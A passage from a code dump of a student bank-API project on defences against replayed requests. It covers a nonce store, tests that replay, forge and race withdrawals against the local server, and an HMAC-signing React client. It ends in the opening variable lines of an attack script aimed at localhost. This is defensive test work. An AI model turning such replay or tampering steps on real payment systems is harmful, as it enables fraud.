    integrityHolds: totalDebited <= authorizedTotal && duplicateDebitCount === 0
  };
}

module.exports = { payloadFingerprint, computeMoneyIntegrity };
````

## server/utils/nonce.js

````js
const DEFAULT_NONCE_TTL_SECONDS = 300;

function nonceKey(userId, nonce) {
  const namespace = process.env.NONCE_KEY_NAMESPACE;
  return namespace ? `used_nonce:${namespace}:${userId}:${nonce}` : `used_nonce:${userId}:${nonce}`;
}

function sqliteRun(db, sql, params = []) {
  return new Promise((resolve, reject) => db.run(sql, params, function (error) {
    if (error) return reject(error);
    resolve(this);
  }));
}

function sqliteGet(db, sql, params = []) {
  return new Promise((resolve, reject) => db.get(sql, params, (error, row) => {
    if (error) return reject(error);
    resolve(row || null);
  }));
}

async function verifyNonce(store, userId, nonce, options = {}) {
  const backend = options.backend || 'redis';
  const ttlSeconds = Number(options.ttlSeconds || process.env.NONCE_TTL || DEFAULT_NONCE_TTL_SECONDS);
  const key = nonceKey(userId, nonce);
  let valid;
  let result;

  if (backend === 'redis') {
    const redisResult = await store.set(key, '1', { NX: true, EX: ttlSeconds });
    valid = redisResult === 'OK';
    result = valid ? 'SETNX_SUCCESS' : 'SETNX_FAILED';
  } else if (backend === 'sqlite') {
    await sqliteRun(store, 'DELETE FROM used_nonces WHERE expires_at <= ?', [Date.now()]);
    try {
      await sqliteRun(store, 'INSERT INTO used_nonces (user_id, nonce, expires_at) VALUES (?, ?, ?)', [userId, nonce, Date.now() + ttlSeconds * 1000]);
      valid = true;
    } catch (error) {
      if (error.code && error.code.startsWith('SQLITE_CONSTRAINT')) valid = false;
      else throw error;
    }
    result = valid ? 'SQLITE_INSERT_SUCCESS' : 'SQLITE_DUPLICATE';
  } else if (backend === 'memory') {
    const now = Date.now();
    for (const [entry, expiresAt] of store) if (expiresAt <= now) store.delete(entry);
    const memKey = `${process.env.NONCE_KEY_NAMESPACE || ''}\u0000${userId}\u0000${nonce}`;
    valid = !store.has(memKey);
    if (valid) store.set(memKey, now + ttlSeconds * 1000);
    result = valid ? 'MEMORY_INSERT_SUCCESS' : 'MEMORY_DUPLICATE';
  } else {
    throw new Error(`Unsupported nonce backend: ${backend}`);
  }

  return {
    valid,
    key,
    redisResult: result
  };
}

async function verifyNonceResilient(store, userId, nonce, options = {}) {
  try {
    return await verifyNonce(store, userId, nonce, options);
  } catch (error) {
    if ((options.failMode || 'fail-closed') === 'fail-open') return { valid: true, redisResult: 'STORE_ERROR_FAIL_OPEN', error };
    return { valid: false, redisResult: 'STORE_ERROR_FAIL_CLOSED', error };
  }
}

async function listNonceKeys(redisClient) {
  const keys = [];
  let cursor = 0;
  const namespace = process.env.NONCE_KEY_NAMESPACE;
  const pattern = namespace ? `used_nonce:${namespace}:*` : 'used_nonce:*';

  do {
    const reply = await redisClient.scan(cursor, {
      MATCH: pattern,
      COUNT: 100
    });
    cursor = Number(reply.cursor);
    keys.push(...reply.keys);
  } while (cursor !== 0);

  return keys.sort();
}

async function clearNonceKeys(redisClient) {
  const keys = await listNonceKeys(redisClient);
  if (keys.length > 0) {
    await redisClient.del(keys);
  }
  return keys;
}

module.exports = {
  NONCE_TTL_SECONDS: Number(process.env.NONCE_TTL || DEFAULT_NONCE_TTL_SECONDS),
  DEFAULT_NONCE_TTL_SECONDS,
  nonceKey,
  verifyNonce,
  verifyNonceResilient,
  sqliteRun,
  sqliteGet,
  listNonceKeys,
  clearNonceKeys
};
````

## server/test/integration.test.js

````js
const test = require('node:test');
const assert = require('node:assert/strict');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const phase3ResultDirectory = path.resolve(__dirname, '../../experiments/results/phase3');
fs.mkdirSync(phase3ResultDirectory, { recursive: true });

process.env.SQLITE_DB = path.join(os.tmpdir(), `cs-project-phase3-${process.pid}-${crypto.randomUUID()}.sqlite`);
process.env.NONCE_STORE = 'memory';
process.env.VIZ_ENABLED = 'false';
process.env.DEMO_MODE = 'false';
process.env.LEGACY_SHARED_SECRET = 'false';
process.env.HMAC_SECRET = '<REDACTED>';
process.env.DEFENSE_HMAC = 'true';
process.env.DEFENSE_TIMESTAMP = 'true';
process.env.DEFENSE_NONCE = 'true';
process.env.DEFENSE_REQUEST_ID = 'true';
process.env.TIMESTAMP_PAST_WINDOW_SECONDS = '300';
process.env.TIMESTAMP_FUTURE_WINDOW_SECONDS = '5';
process.env.ENABLE_TEST_FAULT_ROUTE = 'true';
process.env.EXPERIMENT_LOG = path.join(phase3ResultDirectory, `layer-timings-${process.pid}.csv`);
process.env.CONFIG_ID = 'phase3-default-defenses';
process.env.SCENARIO_ID = 'integration-suite';
process.env.RUN_ID = `windows-node-test-${process.pid}`;

const { app, db, redisClient, initializeDatabase, setClock } = require('../core');
const { generateSignature } = require('../utils/hmac');

let server;
let baseUrl;
let session;
let serverNow = Date.now();

async function call(method, pathName, payload, token = session?.sessionToken) {
  const started = process.hrtime.bigint();
  const response = await fetch(`${baseUrl}${pathName}`, {
    method,
    headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) },
    body: payload === undefined ? undefined : JSON.stringify(payload)
  });
  const text = await response.text();
  const ended = process.hrtime.bigint();
  let data;
  try { data = JSON.parse(text); } catch { data = text; }
  return { status: response.status, data, started_ns: started.toString(), ended_ns: ended.toString(), duration_ns: (ended - started).toString() };
}

function payload(overrides = {}) {
  const result = {
    method: 'POST', path: '/api/withdraw', user_id: 'anis_101', account_id: 'acc_777',
    amount: 10, currency: 'BDT', timestamp: new Date(serverNow).toISOString(),
    nonce: `nonce_${crypto.randomUUID()}`, request_id: `req_${crypto.randomUUID()}`,
    ...overrides
  };
  result.signature = generateSignature(result, session.sessionKey);
  return result;
}

async function reset() {
  serverNow = Date.now();
  setClock(() => serverNow);
  const result = await call('POST', '/api/reset', {});
  assert.equal(result.status, 200);
}

test.before(async () => {
  await initializeDatabase();
  await redisClient.connect();
  server = app.listen(0, '127.0.0.1');
  await new Promise((resolve) => server.once('listening', resolve));
  baseUrl = `http://127.0.0.1:${server.address().port}`;
  const login = await call('POST', '/api/login', { user_id: 'anis_101', pin: '<REDACTED>' }, null);
  assert.equal(login.status, 200);
  session = login.data;
});

test.after(async () => {
  await new Promise((resolve) => server.close(resolve));
  await redisClient.quit();
  await new Promise((resolve) => db.close(resolve));
});

test('account and history lookups return the seeded account and an empty ledger', async () => {
  const balance = await call('GET', '/api/balance/anis_101');
  const history = await call('GET', '/api/transactions/anis_101');
  const missing = await call('GET', '/api/balance/unknown');
  assert.equal(balance.status, 200);
  assert.equal(balance.data.account_id, 'acc_777');
  assert.equal(history.status, 200);
  assert.ok(Array.isArray(history.data.transactions));
  assert.deepEqual(missing.data, { error: 'ACCOUNT_NOT_FOUND' });
});

test('deposit uses signature, timestamp, nonce, request ID and balance pipeline', async () => {
  await reset();
  const request = payload({ path: '/api/deposit', amount: 50, request_id: 'dep-one' });
  const accepted = await call('POST', '/api/deposit', request);
  assert.equal(accepted.status, 200);
  assert.equal(accepted.data.status, 'ACCEPTED');
  const afterNonceWipe = await call('POST', '/api/demo/nonce-crash', {});
  assert.equal(afterNonceWipe.status, 200);
  const replay = await call('POST', '/api/deposit', request);
  assert.equal(replay.data.reason, 'ALREADY_PROCESSED');
  const bad = payload({ path: '/api/deposit', amount: 15 });
  bad.signature = '<REDACTED>'.repeat(64);
  const rejected = await call('POST', '/api/deposit', bad);
  assert.deepEqual(rejected.data, { status: 'REJECTED', reason: 'SIGNATURE_FAIL' });
});

test('withdraw rejects bad signatures, timestamps, account ownership and unknown users', async () => {
  await reset();
  const badSignature = payload();
  badSignature.signature = '<REDACTED>'.repeat(64);
  assert.equal((await call('POST', '/api/withdraw', badSignature)).data.reason, 'SIGNATURE_FAIL');
  const stale = payload({ timestamp: new Date(serverNow - 301000).toISOString() });
  stale.signature = generateSignature(stale, session.sessionKey);
  assert.equal((await call('POST', '/api/withdraw', stale)).data.reason, 'TIMESTAMP_FAIL');
  const badAccount = payload({ account_id: 'someone-elses-account' });
  badAccount.signature = generateSignature(badAccount, session.sessionKey);
  assert.equal((await call('POST', '/api/withdraw', badAccount)).data.reason, 'ACCOUNT_OWNERSHIP_FAIL');
  const unknown = payload({ user_id: 'missing-user' });
  unknown.signature = generateSignature(unknown, session.sessionKey);
  assert.deepEqual((await call('POST', '/api/withdraw', unknown)).data, { error: 'ACCOUNT_NOT_FOUND' });
});

test('insufficient balance is recorded as failed and the request ID remains retryable', async () => {
  await reset();
  const failed = payload({ amount: 20000, request_id: 'retryable-id' });
  assert.deepEqual((await call('POST', '/api/withdraw', failed)).data, { status: 'REJECTED', reason: 'INSUFFICIENT_BALANCE' });
  const retry = payload({ amount: 10, request_id: 'retryable-id' });
  const accepted = await call('POST', '/api/withdraw', retry);
  assert.equal(accepted.data.status, 'ACCEPTED');
});

test('same request ID is idempotent after success, even when nonce state is wiped', async () => {
  await reset();
  const request = payload();
  assert.equal((await call('POST', '/api/withdraw', request)).data.status, 'ACCEPTED');
  await call('POST', '/api/demo/nonce-crash', {});
  const replay = await call('POST', '/api/withdraw', request);
  assert.equal(replay.data.reason, 'ALREADY_PROCESSED');
});

test('malformed input and unknown routes have documented JSON bodies', async () => {
  const malformed = await fetch(`${baseUrl}/api/withdraw`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{' });
  assert.equal(malformed.status, 400);
  assert.deepEqual(await malformed.json(), { error: 'INVALID_REQUEST' });
  assert.deepEqual((await call('GET', '/not-a-route')).data, { error: 'NOT_FOUND' });
});

test('future and past timestamp edges repeat 30 times and save per-request timings', async () => {
  await reset();
  const cases = [
    { label: 'past_tolerance_edge_minus_5s', offsetMs: -5000, expected: 'ACCEPTED' },
    { label: 'future_tolerance_edge_plus_5s', offsetMs: 5000, expected: 'ACCEPTED' },
    { label: 'age_299s', offsetMs: -299000, expected: 'ACCEPTED' },
    { label: 'age_300s', offsetMs: -300000, expected: 'ACCEPTED' },
    { label: 'age_301s_first_rejected_past_side', offsetMs: -301000, expected: 'TIMESTAMP_FAIL' },
    { label: 'future_6s_first_rejected_future_side', offsetMs: 6000, expected: 'TIMESTAMP_FAIL' }
  ];
  const rows = [];
  for (const item of cases) {
    for (let repetition = 1; repetition <= 30; repetition += 1) {
      const request = payload({ amount: 1, timestamp: new Date(serverNow + item.offsetMs).toISOString(), request_id: `boundary-${item.label}-${repetition}` });
      request.signature = generateSignature(request, session.sessionKey);
      const result = await call('POST', '/api/withdraw', request);
      const outcome = result.data.status === 'ACCEPTED' ? 'ACCEPTED' : result.data.reason;
      assert.equal(outcome, item.expected, `${item.label} repetition ${repetition}`);
      rows.push({ label: item.label, repetition, offset_ms: item.offsetMs, ...result, outcome });
    }
  }
  const output = path.resolve(__dirname, '../../experiments/results/corrections');
  fs.mkdirSync(output, { recursive: true });
  fs.writeFileSync(path.join(output, 'timestamp-boundaries-30-each.csv'), [
    'label,repetition,offset_ms,started_ns,ended_ns,duration_ns,http_status,outcome',
    ...rows.map((row) => [row.label, row.repetition, row.offset_ms, row.started_ns, row.ended_ns, row.duration_ns, row.status, row.outcome].join(','))
  ].join('\n') + '\n');
  fs.writeFileSync(path.join(output, 'timestamp-boundaries-30-each.json'), JSON.stringify({ repetitionsPerCase: 30, vizEnabled: process.env.VIZ_ENABLED === 'true', cases: cases.map((item) => ({ ...item, measuredCount: rows.filter((row) => row.label === item.label && row.outcome === item.expected).length })), firstRejectedPastAgeSeconds: 301, firstRejectedFutureOffsetSeconds: 6, responses: rows }, null, 2) + '\n');
});

test('Phase 0 client clock offsets repeat 30 times per offset and save per-request timings', async () => {
  await reset();
  const cases = [
    { label: 'minus_10m', offsetMs: -600000, expected: 'TIMESTAMP_FAIL' },
    { label: 'minus_1m', offsetMs: -60000, expected: 'ACCEPTED' },
    { label: 'plus_10s', offsetMs: 10000, expected: 'TIMESTAMP_FAIL' },
    { label: 'plus_1m', offsetMs: 60000, expected: 'TIMESTAMP_FAIL' },
    { label: 'plus_10m', offsetMs: 600000, expected: 'TIMESTAMP_FAIL' }
  ];
  const rows = [];
  for (const item of cases) {
    for (let repetition = 1; repetition <= 30; repetition += 1) {
      const request = payload({ amount: 1, timestamp: new Date(serverNow + item.offsetMs).toISOString(), request_id: `clock-offset-${item.label}-${repetition}` });
      request.signature = generateSignature(request, session.sessionKey);
      const result = await call('POST', '/api/withdraw', request);
      const outcome = result.data.status === 'ACCEPTED' ? 'ACCEPTED' : result.data.reason;
      assert.equal(outcome, item.expected, `${item.label} repetition ${repetition}`);
      rows.push({ label: item.label, repetition, offset_ms: item.offsetMs, ...result, outcome });
    }
  }
  const output = path.resolve(__dirname, '../../experiments/results/corrections');
  fs.mkdirSync(output, { recursive: true });
  fs.writeFileSync(path.join(output, 'clock-offsets-30-each.csv'), [
    'label,repetition,offset_ms,started_ns,ended_ns,duration_ns,http_status,outcome',
    ...rows.map((row) => [row.label, row.repetition, row.offset_ms, row.started_ns, row.ended_ns, row.duration_ns, row.status, row.outcome].join(','))
  ].join('\n') + '\n');
  fs.writeFileSync(path.join(output, 'clock-offsets-30-each.json'), JSON.stringify({ repetitionsPerOffset: 30, vizEnabled: process.env.VIZ_ENABLED === 'true', cases: cases.map((item) => ({ ...item, measuredCount: rows.filter((row) => row.label === item.label && row.outcome === item.expected).length })), responses: rows }, null, 2) + '\n');
});

test('deposit unknown account, invalid fields, and internal error response contracts are covered', async () => {
  await reset();
  const invalid = await call('POST', '/api/deposit', { user_id: 'anis_101', account_id: 'acc_777', amount: 0 });
  assert.deepEqual(invalid.data, { error: 'INVALID_REQUEST' });
  const unknown = payload({ path: '/api/deposit', user_id: 'absent-user', amount: 10 });
  unknown.signature = generateSignature(unknown, session.sessionKey);
  assert.deepEqual((await call('POST', '/api/deposit', unknown)).data, { error: 'ACCOUNT_NOT_FOUND' });
  const originalError = console.error;
  console.error = () => {};
  try {
    assert.deepEqual((await call('GET', '/__test/unhandled-error')).data, { error: 'INTERNAL_SERVER_ERROR' });
  } finally { console.error = originalError; }
});

test('50 identical concurrent requests produce one debit and one acceptance', async () => {
  await reset();
  const request = payload({ amount: 1 });
  const results = await Promise.all(Array.from({ length: 50 }, () => call('POST', '/api/withdraw', request)));
  assert.equal(results.filter((result) => result.data.status === 'ACCEPTED').length, 1);
  assert.equal(results.filter((result) => result.data.reason === 'NONCE_FAIL').length, 49);
  const balance = await call('GET', '/api/balance/anis_101');
  assert.equal(balance.data.balance, 9999);
});

test('50 valid nonces racing on one request ID produce one debit', async () => {
  await reset();
  const results = await Promise.all(Array.from({ length: 50 }, (_, index) => {
    const request = payload({ amount: 1, request_id: 'shared-race-request-id', nonce: `different-nonce-${index}` });
    request.signature = generateSignature(request, session.sessionKey);
    return call('POST', '/api/withdraw', request);
  }));
  assert.equal(results.filter((result) => result.data.status === 'ACCEPTED').length, 1);
  const balance = await call('GET', '/api/balance/anis_101');
  assert.equal(balance.data.balance, 9999);
});

test('session authentication must match the signed user ID', async () => {
  await reset();
  const user = payload({ user_id: 'anis_101' });
  const foreignToken = '<REDACTED>';
  assert.equal((await call('POST', '/api/withdraw', user, foreignToken)).data.reason, 'SESSION_INVALID');
  const noSession = await call('POST', '/api/withdraw', user, null);
  assert.equal(noSession.data.reason, 'AUTHENTICATION_REQUIRED');
});

test('legacy shared-secret signatures are rejected when LEGACY_SHARED_SECRET is false', async () => {
  assert.equal(process.env.LEGACY_SHARED_SECRET, 'false');
  const legacySigned = {
    method: 'POST', path: '/api/withdraw', user_id: 'anis_101', account_id: 'acc_777',
    amount: 1, currency: 'BDT', timestamp: new Date(serverNow).toISOString(),
    nonce: `legacy-${crypto.randomUUID()}`, request_id: `legacy-${crypto.randomUUID()}`
  };
  legacySigned.signature = generateSignature(legacySigned, process.env.HMAC_SECRET);
  const response = await call('POST', '/api/withdraw', legacySigned, session.sessionToken);
  assert.equal(response.status, 401);
  assert.deepEqual(response.data, { status: 'REJECTED', reason: 'SIGNATURE_FAIL' });
});

test('CHECK_ORDER accepts timestamp-first and request-ID-before-nonce alternatives', () => {
  assert.deepEqual(require('../core').helpers.parseOrder('timestamp first'), ['timestamp', 'hmac', 'nonce', 'request_id', 'balance']);
  assert.deepEqual(require('../core').helpers.parseOrder('request_id before nonce'), ['hmac', 'timestamp', 'request_id', 'nonce', 'balance']);
  assert.deepEqual(require('../core').helpers.parseOrder('timestamp,hmac,nonce,request_id,balance'), ['timestamp', 'hmac', 'nonce', 'request_id', 'balance']);
});
````

## server/test/migration.test.js

````js
const test = require('node:test');
const assert = require('node:assert/strict');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();

const dbPath = path.join(os.tmpdir(), `cs-project-migration-${process.pid}-${crypto.randomUUID()}.sqlite`);
process.env.SQLITE_DB = dbPath;
process.env.NONCE_STORE = 'memory';
process.env.VIZ_ENABLED = 'false';
process.env.LEGACY_SHARED_SECRET = 'false';
process.env.HMAC_SECRET = '<REDACTED>';

function rawRun(db, sql, params = []) {
  return new Promise((resolve, reject) => db.run(sql, params, function (error) { error ? reject(error) : resolve(this); }));
}
function rawGet(db, sql, params = []) {
  return new Promise((resolve, reject) => db.get(sql, params, (error, row) => error ? reject(error) : resolve(row || null)));
}

let core;
test.before(async () => {
  const legacy = new sqlite3.Database(dbPath);
  await rawRun(legacy, 'PRAGMA foreign_keys=ON');
  await rawRun(legacy, `CREATE TABLE accounts (user_id TEXT PRIMARY KEY, username TEXT NOT NULL, balance INTEGER NOT NULL DEFAULT 10000, currency TEXT DEFAULT 'BDT', created_at DATETIME DEFAULT CURRENT_TIMESTAMP)`);
  await rawRun(legacy, "INSERT INTO accounts (user_id, username, balance) VALUES ('anis_101','Anis Ahmed',10000)");
  await rawRun(legacy, `CREATE TABLE transactions (id INTEGER PRIMARY KEY AUTOINCREMENT, request_id TEXT UNIQUE NOT NULL, user_id TEXT NOT NULL, account_id TEXT NOT NULL, type TEXT NOT NULL CHECK(type IN ('DEPOSIT','WITHDRAW')), amount INTEGER NOT NULL, currency TEXT DEFAULT 'BDT', status TEXT NOT NULL CHECK(status IN ('SUCCESS','FAILED')), reason TEXT, signature TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP, FOREIGN KEY(user_id) REFERENCES accounts(user_id))`);
  await rawRun(legacy, "INSERT INTO transactions (request_id,user_id,account_id,type,amount,status,reason) VALUES ('legacy-failed','anis_101','acc_777','WITHDRAW',20000,'FAILED','INSUFFICIENT_BALANCE')");
  await new Promise((resolve, reject) => legacy.close((error) => error ? reject(error) : resolve()));
  core = require('../core');
  await core.initializeDatabase();
});

test.after(async () => new Promise((resolve, reject) => core.db.close((error) => error ? reject(error) : resolve())));

test('migration preserves old rows and replaces global request ID uniqueness with SUCCESS-only index', async () => {
  const legacyRow = await core.helpers.get("SELECT request_id,status,reason FROM transactions WHERE request_id='legacy-failed'");
  const table = await core.helpers.get("SELECT sql FROM sqlite_master WHERE type='table' AND name='transactions'");
  const index = await core.helpers.get("SELECT sql FROM sqlite_master WHERE type='index' AND name='idx_transactions_success_request_id'");
  assert.deepEqual(legacyRow, { request_id: 'legacy-failed', status: 'FAILED', reason: 'INSUFFICIENT_BALANCE' });
  assert.doesNotMatch(table.sql, /request_id\s+TEXT\s+UNIQUE/i);
  assert.match(index.sql, /WHERE\s+status\s*=\s*'SUCCESS'/i);
});

test('FAILED ID may be retried as SUCCESS, but a second SUCCESS with that ID is blocked', async () => {
  assert.equal((await require('../utils/idempotency').isRequestProcessed(core.db, 'legacy-failed')).processed, false);
  await core.helpers.run("INSERT INTO transactions (request_id,user_id,account_id,type,amount,status) VALUES ('legacy-failed','anis_101','acc_777','WITHDRAW',5,'SUCCESS')");
  assert.equal((await require('../utils/idempotency').isRequestProcessed(core.db, 'legacy-failed')).processed, true);
  await assert.rejects(core.helpers.run("INSERT INTO transactions (request_id,user_id,account_id,type,amount,status) VALUES ('legacy-failed','anis_101','acc_777','WITHDRAW',5,'SUCCESS')"), /UNIQUE constraint failed/i);
});
````

## server/test/unit.test.js

````js
const test = require('node:test');
const assert = require('node:assert/strict');
const { generateSignature, verifySignature } = require('../utils/hmac');
const { verifyNonce, verifyNonceResilient } = require('../utils/nonce');
const { isRequestProcessed } = require('../utils/idempotency');
const { computeMoneyIntegrity, payloadFingerprint } = require('../utils/money-oracle');
const sqlite3 = require('sqlite3').verbose();
const { sqliteRun } = require('../utils/nonce');

test('HMAC signs the canonical payload and rejects a modified field', () => {
  const payload = { method: 'POST', path: '/api/withdraw', user_id: 'u1', account_id: 'a1', amount: 20, currency: 'BDT', timestamp: '2026-01-01T00:00:00.000Z', nonce: 'n1', request_id: 'r1' };
  payload.signature = generateSignature(payload, 'unit-test-key');
  assert.equal(verifySignature(payload, 'unit-test-key').valid, true);
  assert.equal(verifySignature({ ...payload, amount: 21 }, 'unit-test-key').valid, false);
});

test('memory nonce backend atomically accepts once and expires entries', async () => {
  const store = new Map();
  assert.equal((await verifyNonce(store, 'u', 'n', { backend: 'memory', ttlSeconds: 1 })).valid, true);
  assert.equal((await verifyNonce(store, 'u', 'n', { backend: 'memory', ttlSeconds: 1 })).valid, false);
  await new Promise((resolve) => setTimeout(resolve, 1050));
  assert.equal((await verifyNonce(store, 'u', 'n', { backend: 'memory', ttlSeconds: 1 })).valid, true);
});

test('SQLite nonce backend enforces durable uniqueness and expires entries', async () => {
  const db = new sqlite3.Database(':memory:');
  await sqliteRun(db, 'CREATE TABLE used_nonces (user_id TEXT NOT NULL, nonce TEXT NOT NULL, expires_at INTEGER NOT NULL, PRIMARY KEY(user_id, nonce))');
  assert.equal((await verifyNonce(db, 'u', 'sqlite-nonce', { backend: 'sqlite', ttlSeconds: 60 })).valid, true);
  assert.equal((await verifyNonce(db, 'u', 'sqlite-nonce', { backend: 'sqlite', ttlSeconds: 60 })).valid, false);
  await sqliteRun(db, 'UPDATE used_nonces SET expires_at = 0');
  assert.equal((await verifyNonce(db, 'u', 'sqlite-nonce', { backend: 'sqlite', ttlSeconds: 60 })).valid, true);
  await new Promise((resolve, reject) => db.close((error) => error ? reject(error) : resolve()));
});

test('nonce-store failure policy opens or closes exactly as configured', async () => {
  const unavailableRedis = { set: async () => { throw new Error('store unavailable'); } };
  const open = await verifyNonceResilient(unavailableRedis, 'u', 'n', { backend: 'redis', failMode: 'fail-open' });
  const closed = await verifyNonceResilient(unavailableRedis, 'u', 'n', { backend: 'redis', failMode: 'fail-closed' });
  assert.deepEqual([open.valid, open.redisResult], [true, 'STORE_ERROR_FAIL_OPEN']);
  assert.deepEqual([closed.valid, closed.redisResult], [false, 'STORE_ERROR_FAIL_CLOSED']);
});

test('idempotency is scoped to successful transactions so failures may retry', async () => {
  const fakeDb = {
    get(sql, params, callback) {
      assert.match(sql, /status\s*=\s*'SUCCESS'/);
      callback(null, params[0] === 'success' ? { request_id: 'success', status: 'SUCCESS' } : null);
    }
  };
  assert.deepEqual((await isRequestProcessed(fakeDb, 'failed')).processed, false);
  assert.equal((await isRequestProcessed(fakeDb, 'success')).processed, true);
});

test('money integrity oracle counts debits and repeated signed payloads', () => {
  const payload = { method: 'POST', path: '/api/withdraw', user_id: 'u', account_id: 'a', amount: 10, currency: 'BDT', timestamp: 't', nonce: 'n', request_id: 'r', signature: '<REDACTED>' };
  const fingerprint = payloadFingerprint(payload);
  const report = computeMoneyIntegrity([
    { type: 'WITHDRAW', status: 'SUCCESS', amount: 10, payload_fingerprint: fingerprint },
    { type: 'WITHDRAW', status: 'SUCCESS', amount: 10, payload_fingerprint: fingerprint }
  ], [payload]);
  assert.equal(report.totalDebited, 20);
  assert.equal(report.duplicateDebitCount, 1);
  assert.equal(report.integrityHolds, false);
});
````

## client/bank/src/api.js

````js
import axios from 'axios';

const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:3000';
const USER_ID = 'anis_101';
const ACCOUNT_ID = 'acc_777';
const CURRENCY = 'BDT';
let session = null;

const api = axios.create({
  baseURL: API_BASE_URL,
  headers: {
    'Content-Type': 'application/json'
  }
});

function bytesToHex(buffer) {
  return [...new Uint8Array(buffer)]
    .map((byte) => byte.toString(16).padStart(2, '0'))
    .join('');
}
// random token for nonce and request_id to prevent replay attacks
function randomToken(prefix) {
  const values = new Uint32Array(3);
  window.crypto.getRandomValues(values);
  return `${prefix}_${Array.from(values).map((value) => value.toString(16)).join('')}`;
}

// 9 IMPORTANT DATA OF REQUEST BODY TO BE SIGNED IN HMAC MESSAGE
export function buildHmacMessage(payload) {
  return [
    payload.method,
    payload.path,
    payload.user_id,
    payload.account_id,
    payload.amount,
    payload.currency,
    payload.timestamp,
    payload.nonce,
    payload.request_id
  ].join('|'); // using pipe '|' as a separator for the HMAC message
}

// Hashing Logic to sign the payload using HMAC-SHA256
export async function signPayload(payload) {
  if (!session?.sessionKey) throw new Error('Please log in before signing a transaction');
  const encoder = new TextEncoder();
  const key = await window.crypto.subtle.importKey(
    'raw',
    encoder.encode(session.sessionKey),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
  const signature = await window.crypto.subtle.sign(
    'HMAC',
    key,
    encoder.encode(buildHmacMessage(payload))
  );
  return bytesToHex(signature); // This Signature will be sent to the server for verification of the request
}

export async function login(userId, pin) {
  const response = await api.post('/api/login', { user_id: userId || USER_ID, pin });
  session = response.data;
  api.defaults.headers.common.Authorization = `Bearer ${session.sessionToken}`;
  return session.user_id;
}

export function logout() {
  session = null;
  delete api.defaults.headers.common.Authorization;
}

export function currentUserId() {
  return session?.user_id || USER_ID;
}

export async function createSignedWithdrawPayload(amount) {
  const payload = {
    method: 'POST',
    path: '/api/withdraw',
    user_id: USER_ID,
    account_id: ACCOUNT_ID,
    amount: Number(amount),
    currency: CURRENCY,
    timestamp: new Date().toISOString(), // time added to the payload to prevent replay attacks
    nonce: randomToken('nonce'),  // nonce added to the payload to prevent replay attacks
    request_id: randomToken('wd') // request_id added to the payload to prevent replay attacks
  };

  payload.signature = await signPayload(payload);
  return payload;
}

export async function createSignedDepositPayload(amount) {
  const payload = {
    method: 'POST',
    path: '/api/deposit',
    user_id: currentUserId(),
    account_id: ACCOUNT_ID,
    amount: Number(amount),
    currency: CURRENCY,
    timestamp: new Date().toISOString(),
    nonce: randomToken('nonce'),
    request_id: randomToken('dep')
  };
  payload.signature = await signPayload(payload);
  return payload;
}

export async function getBalance() {
  const response = await api.get(`/api/balance/${currentUserId()}`);
  return response.data;
}

export async function getTransactions() {
  const response = await api.get(`/api/transactions/${currentUserId()}`);
  return response.data.transactions;
}

export async function withdraw(amount) {
  const payload = await createSignedWithdrawPayload(amount);
  const response = await api.post('/api/withdraw', payload);
  return {
    data: response.data,
    payload
  };
}

export async function deposit(amount) {
  const payload = await createSignedDepositPayload(amount);
  const response = await api.post('/api/deposit', payload);
  return response.data;
}
````

## client/bank/src/App.jsx

````jsx
import React, { useCallback, useEffect, useState } from 'react';
import { createRoot } from 'react-dom/client';
import BalanceDisplay from './components/BalanceDisplay.jsx';
import WithdrawForm from './components/WithdrawForm.jsx';
import DepositForm from './components/DepositForm.jsx';
import TransactionHistory from './components/TransactionHistory.jsx';
import { getBalance, getTransactions, login } from './api.js';
import { socket } from './socket.js';
import './styles.css';

function App() {
  const [balance, setBalance] = useState(null);
  const [transactions, setTransactions] = useState([]);
  const [status, setStatus] = useState('Ready');
  const [lastPayload, setLastPayload] = useState(null);
  const [authenticated, setAuthenticated] = useState(false);
  const [userId, setUserId] = useState('anis_101');
  const [pin, setPin] = useState('');

  const refreshData = useCallback(async () => {
    const [balanceData, transactionData] = await Promise.all([
      getBalance(),
      getTransactions()
    ]);
    setBalance(balanceData);
    setTransactions(transactionData);
  }, []);

  useEffect(() => {
    if (!authenticated) return;
    refreshData().catch((error) => {
      setStatus(error.response?.data?.error || error.message);
    });
  }, [authenticated, refreshData]);

  async function handleLogin(event) {
    event.preventDefault();
    try {
      await login(userId, pin);
      setAuthenticated(true);
      setPin('');
      setStatus('Logged in');
    } catch (error) {
      setStatus(error.response?.data?.error || error.message);
    }
  }

  useEffect(() => {
    function handleReset() {
      setLastPayload(null);
      setStatus('Demo reset received');
      refreshData().catch((error) => {
        setStatus(error.response?.data?.error || error.message);
      });
    }

    socket.on('reset', handleReset);
    return () => {
      socket.off('reset', handleReset);
    };
  }, [refreshData]);

  return (
    <main className="shell">
      <section className="topbar">
        <div>
          <p className="eyebrow">Anis Ahmed</p>
          <h1>Bank Account</h1>
        </div>
        <div className="status">{status}</div>
      </section>

      {!authenticated ? (
        <form className="tool-panel" onSubmit={handleLogin}>
          <h2>Log in</h2>
          <label>
            User ID
            <input value={userId} onChange={(event) => setUserId(event.target.value)} required />
          </label>
          <label>
            PIN
            <input type="password" inputMode="numeric" value={pin} onChange={(event) => setPin(event.target.value)} required />
          </label>
          <button type="submit">Log in</button>
        </form>
      ) : (
        <>
          <BalanceDisplay balance={balance} />
          <section className="actions">
            <WithdrawForm onStatus={setStatus} onPayload={setLastPayload} onComplete={refreshData} />
            <DepositForm onStatus={setStatus} onComplete={refreshData} />
          </section>
        </>
      )}

      {lastPayload && (
        <section className="payload-panel">
          <h2>Last Withdraw Payload</h2>
          <pre>{JSON.stringify(lastPayload, null, 2)}</pre>
        </section>
      )}

      <TransactionHistory transactions={transactions} />
    </main>
  );
}

createRoot(document.getElementById('root')).render(<App />);
````

## attack/attack.sh

````sh
#!/usr/bin/env bash
set -euo pipefail

HOST="localhost:3000"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD_FILE="$SCRIPT_DIR/payload.json"
CAPTURE_FILE="${CAPTURE_FILE:-/tmp/eve-captured.json}"
TAMPERED_FILE="/tmp/eve-tampered.json"
TIMING_CSV="${TIMING_CSV:-/tmp/eve-attack-timings.csv}"
